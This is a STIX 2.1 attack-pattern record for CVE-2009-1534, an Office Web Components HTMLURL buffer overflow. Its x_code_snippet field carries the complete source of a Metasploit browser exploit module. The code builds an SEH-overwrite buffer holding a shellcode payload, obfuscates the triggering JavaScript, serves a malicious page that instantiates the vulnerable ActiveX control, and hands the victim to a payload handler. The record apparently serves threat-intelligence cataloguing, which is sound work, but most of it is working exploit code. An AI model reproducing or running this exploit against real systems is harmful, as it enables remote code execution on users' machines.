{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d45cc4cc-d30a-4bb6-8ce2-48d6541a50b1",
    "created": "2024-08-14T16:40:52.91735Z",
    "modified": "2024-08-14T16:40:52.917354Z",
    "name": "Microsoft OWC Spreadsheet HTMLURL Buffer Overflow",
    "description": " This module exploits a buffer overflow in Microsoft's Office Web Components.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms09_043_owc_htmlurl.rb",
            "external_id": "ms09_043_owc_htmlurl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1534"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=819"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft OWC Spreadsheet HTMLURL Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Microsoft's Office Web Components.\n        When passing an overly long string as the \"HTMLURL\" parameter an attacker can\n        execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-1534' ],\n          [ 'OSVDB', '56916' ],\n          [ 'BID', '35992' ],\n          [ 'MSB', 'MS09-043' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=819' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\\xf0\",\n          'DisableNops'   => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # 'ProgId' => \"OWC.Spreadsheet.9\"\n          # 'ClassId' => \"0002E512-0000-0000-C000-000000000046\",\n\n          [ 'Windows XP SP3 - IE6 - Office XP SP0',\n            {\n              'ClassId' => \"0002E510-0000-0000-C000-000000000046\",\n              'Offset'  => 31337,\n              'Ret'     => 0x42424242 # p/p/r in msohev.dll ??\n            }\n          ],\n\n          [ 'Windows XP SP3 - IE6 - Office XP SP3',\n            {\n              'ClassId' => \"0002E511-0000-0000-C000-000000000046\",\n              'Offset'  => ((4096*7) + 1076),\n              'Ret'     => 0x32521239 # p/p/r in msohev.dll 10.0.2609.0\n            }\n          ]\n        ],\n      'DisclosureDate' => '2009-08-11',\n      'DefaultTarget'  => 1))\n\n    register_options(\n      [\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ])\n      ])\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def big_alnum(num)\n    divisor = 2048 + rand(2048)\n    pad_pages = num / divisor\n    pad_left = num % divisor\n\n    ret = ''\n    ret << rand_text_alphanumeric(divisor) * pad_pages if pad_pages\n    ret << rand_text_alphanumeric(pad_left) if pad_left\n    ret\n  end\n\n  def on_request_uri(cli, request)\n=begin\n    # Only respond to any client twice...\n    if (@sent[cli.peerhost] > 1)\n      send_not_found(cli)\n      return\n    end\n    @sent[cli.peerhost] += 1\n=end\n\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # ActiveX parameter(s)\n    clsid = target['ClassId']\n\n    # Exploitation parameter(s)\n    seh_offset = target['Offset']\n\n    # Build the buffer.\n    string = big_alnum(seh_offset)\n    string << generate_seh_record(target.ret)\n    string << payload.encoded\n    string << big_alnum(40960 - string.length)\n    string = Rex::Text.to_unescape(string)\n\n    # Randomize the object and function names\n    objid = rand_text_alpha(8+rand(8))\n    fnname = rand_text_alpha(8+rand(8))\n\n    # Build the final JavaScript\n    js = %Q|\nfunction #{fnname}()\n{\nvar ver1 = -1;\nvar ver3 = -1;\ntry {\nver3 = #{objid}.Version.split('.')[3];\nver3 = parseInt(ver3);\nver1 = #{objid}.Version.split('.')[0];\nver1 = parseInt(ver1);\n} catch (e) { }\nif (ver1 == 9 && ver3 <= 8966)\n{\nhistory.go(0);\n#{objid}.HTMLURL = unescape('#{string}');\n}\n}\n|\n\n    # Obfuscate the javascript\n    opts = {\n      'Strings' => false, # way too slow to obfuscate this monster\n      'Symbols' => {\n        'Variables' => %w{ long ver1 ver3 },\n      }\n    }\n    js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)\n    js.obfuscate(memory_sensitive: true)\n#<body onload=\"history.go(0); #{fnname}()\">\n\n    # Build the final HTML\n    content = %Q|<html>\n<head>\n<script language=javascript>\n#{js}\n</script>\n</head>\n<body onload=\"#{fnname}()\">\n<object classid=\"clsid:#{clsid}\" id=\"#{objid}\">\n</object>\n</body>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content,\n      {\n        # The vuln requires that this be the same on both requests.\n        'Last-Modified' => 'Tue, 11 Aug 2009 07:13:49 GMT',\n      })\n\n    # Handle the payload\n    handler(cli)\n  end\n\n\nend\n",
    "x_mitre_contributors": [
        "[ jduck ]",
        ""
    ],
    "x_mitre_disclosure_date": "2009-08-11",
    "x_mitre_platforms": [
        "win'"
    ]
}